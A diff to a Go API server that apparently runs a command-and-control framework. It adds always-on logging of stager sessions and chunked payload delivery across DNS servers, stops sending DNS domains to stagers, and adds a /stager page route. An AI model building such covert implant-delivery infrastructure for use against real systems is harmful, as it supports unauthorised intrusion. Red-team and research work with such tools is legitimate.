@@ -1359,16 +1359,19 @@ func (api *APIServer) handleStagerInit(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	// Always log stager session creation (not just in debug mode)
+	fmt.Printf("[API] 🚀 Stager session created: %s | Stager: %s (%s/%s) | Chunks: %d across %d DNS servers\n",
+		sessionID[:16], req.StagerIP, req.OS, req.Arch, totalChunks, len(dnsServerIDs))
+
 	if api.config.Debug {
-		fmt.Printf("[API] Stager session created: %s (%d chunks across %d DNS servers)\n",
-			sessionID, totalChunks, len(dnsServerIDs))
+		fmt.Printf("[API] DNS domains available: %v\n", dnsDomains)
 	}
 
-	// Return session info and DNS domains list
+	// Return simple session info (domains are compiled into stager now)
 	response := StagerInitResponse{
 		SessionID:   sessionID,
 		TotalChunks: totalChunks,
-		DNSDomains:  dnsDomains,
+		DNSDomains:  nil, // Not needed - stager has domains compiled in
 		ChunkSize:   403,
 	}
 
@@ -1421,9 +1424,12 @@ func (api *APIServer) handleStagerChunk(w http.ResponseWriter, r *http.Request) 
 	// Update session activity
 	api.db.UpdateStagerSessionActivity(req.SessionID)
 
+	// Log chunk delivery (always, not just debug)
+	fmt.Printf("[API] 📦 Chunk %d delivered to stager %s via DNS server %s\n",
+		req.ChunkIndex, req.StagerIP, dnsServerID)
+
 	if api.config.Debug {
-		fmt.Printf("[API] Chunk %d for session %s served by %s (assigned to %s)\n",
-			req.ChunkIndex, req.SessionID, dnsServerID, assignedDNS)
+		fmt.Printf("[API] Debug: Session %s, assigned to %s\n", req.SessionID, assignedDNS)
 	}
 
 	// Return chunk data
@@ -1444,6 +1450,7 @@ func (api *APIServer) SetupRoutes(router *mux.Router) {
 	router.HandleFunc("/dashboard", api.handleDashboardPage).Methods("GET")
 	router.HandleFunc("/beacon", api.handleBeaconPage).Methods("GET")
 	router.HandleFunc("/builder", api.handleBuilderPage).Methods("GET")
+	router.HandleFunc("/stager", api.handleStagerPage).Methods("GET")
 	router.HandleFunc("/users", api.handleUsersPage).Methods("GET")
 
 	// Serve static files (CSS, JS, images)
@@ -1534,4 +1541,8 @@ func (api *APIServer) handleBeaconPage(w http.ResponseWriter, r *http.Request) {
 
 func (api *APIServer) handleUsersPage(w http.ResponseWriter, r *http.Request) {
 	http.ServeFile(w, r, filepath.Join(api.config.WebRoot, "users.html"))
+}
+
+func (api *APIServer) handleStagerPage(w http.ResponseWriter, r *http.Request) {
+	http.ServeFile(w, r, filepath.Join(api.config.WebRoot, "stager.html"))
 }
